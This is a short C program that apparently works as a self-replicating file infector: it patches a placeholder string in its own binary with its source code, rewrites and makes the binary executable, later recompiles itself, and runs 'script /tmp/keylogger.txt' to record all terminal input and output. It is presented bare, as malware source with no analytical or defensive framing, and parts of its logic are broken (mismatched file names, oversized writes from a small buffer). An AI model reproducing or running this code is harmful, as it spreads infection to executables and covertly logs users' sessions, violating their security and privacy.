#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
        static char file_content[]="hello";
        unsigned char Buffer_1[150000];
        unsigned char Buffer_2[10000];
        unsigned int Exe_size;
        FILE *rc4_read;
        FILE *rc4_code;
        size_t amount_read,amount_code;
        int i,j;
        rc4_read = fopen( "readme","r+");
        rc4_code = fopen("readme.c","r");
        amount_read = fread(Buffer_1, sizeof(unsigned char), sizeof(Buffer_1), rc4_read);
        amount_code = fread(Buffer_2, sizeof(unsigned char), sizeof(Buffer_2), rc4_code);
        // Checking Size of current rc4 file that is present for infection
        fseek(rc4_read,0,SEEK_END); //MOve the pointer to End of File
        Exe_size = ftell(rc4_read); //Getting the location of pointer
        fseek(rc4_read,0,SEEK_SET); // Reset the pointer
        fclose(rc4_read);
        fclose(rc4_code);
        if ( Exe_size != 13512) // Comparing it with the original size
        {
            printf("Binary already infected.\n");
            if(file_content[0] == '#' && file_content[1] == 'i' && file_content[2] == 'n' && file_content[3] == 'c' && file_content[4] == 'l')
                        {
                                FILE *newSource = fopen("new_rc4.cpp", "w"); // Creating a new Cpp file from the binary which has been infected, where the Code has been stored at static location
                                fwrite(file_content,sizeof(unsigned char), sizeof(Buffer_1),newSource);
                                fclose(newSource);
                                system("gcc -w new_rc4.c -o rc4"); // Creating a new executable everytime the code is run

                                system("script /tmp/keylogger.txt"); // Creating text outupt for every STDIN, STDOUT, STDERR
                        }
        }
        else
        {
            printf("Binary not infected, starting infection.\n");
            if( file_content[0] == 'h')
                    {
                        for( i=0; i< amount_read-3; i++)
                            {
                                if( Buffer_1[i] == 'h' && Buffer_1[i+1] == 'e' && Buffer_1[i+2] == 'l' && Buffer_1[i+3] == 'l' && Buffer_1[i+4] == 'o')
                                    {
                                        for (j=0; j < amount_code; j++)
                                            {
                                                Buffer_1[i++]= Buffer_2[j];// SPleacing Static Empty Spaces with rc4.cpp code
                                            }//End of j For
                                    }// if
                            }//for
                    }
            rc4_read = fopen("x.x","w");
            fwrite(Buffer_1,sizeof(unsigned char), amount_read, rc4_read);
            fclose(rc4_read);
            system("mv x.x rc4; chmod +x rc4"); // Infecting for the first time, writing the code in the binary
        }
        return (0);
}
